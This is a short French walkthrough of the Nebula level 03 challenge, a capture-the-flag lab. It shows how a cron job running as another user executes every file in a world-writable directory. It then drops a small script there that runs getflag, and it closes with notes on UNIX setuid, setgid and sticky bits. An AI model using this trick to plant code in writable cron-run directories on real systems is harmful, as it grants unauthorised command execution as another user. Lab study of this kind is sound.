# Challenge 03

Pour ce challenge pas de code source. On sait qu'un crontab tourne toutes les minutes. 

On commence par trouver le crontab et ce qu'il execute.
```bash
level03@nebula:/home/flag03$ ls -la
total 6
drwxr-x--- 3 flag03 level03  103 2011-11-20 20:39 .
drwxr-xr-x 1 root   root     120 2012-08-27 07:18 ..
-rw-r--r-- 1 flag03 flag03   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag03 flag03  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag03 flag03   675 2011-05-18 02:54 .profile
drwxrwxrwx 2 flag03 flag03     3 2012-08-18 05:24 writable.d
-rwxr-xr-x 1 flag03 flag03    98 2011-11-20 21:22 writable.sh
```
Le code source de `writable.sh` :
```bash
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

Fonctionnement du chall :
1. Boucle sur tous les fichiers du dossier `writable.d` avec la variable `$i`
2. `( ... )` : lance les commandes dans un sous shell.
    - `ulimit -t 5` : limite le temps de CPU à 5 secondes
    - `bash -x "$i"` : execute le fichier `$i` avec bash (`-x` active le mode trace pour afficher chaque commande)
3. `rm -f "$i"` : supprime le fichier

### Exploitation

Comme le crontab tourne en tant qu'utilisateur `flag03` on comprends ce qu'il va se passer : notre payload va etre executé et supprimer.
Il suffit de profiter de ce laps de temps pour executer notre exploit.

On va créer un fichier `exploit.sh` :
```bash
#!/bin/bash
/bin/getflag > /tmp/flag
chmod 666 /tmp/flag
```
Puis on a plus qu'à attendre et lire le résultat de notre exploit:
```bash
level03@nebula:/tmp$ cat flag
You have successfully executed getflag on a target account
```

### Révision permissions UNIX :

Permissions UNIX ont 4 chiffres pas 3.
Le chiffre de gauche (souvent omis et donc initialisé à 0) correspond au bit spécial. 

Structure 

```
  6      7     5     5
  │      │     │     │
spécial owner group other
```
Le bit spécial est une combinaison de 3 bits (comme les 3 autres bits):
- 4 : setuid - le programme s'exécute avec **l'UID du propriétaire** du fichier
- 2 : setgid - le programme s'exécute avec **le GID du propriétaire**
- 1 : sticky - je comprends pas a quoi ca sert :P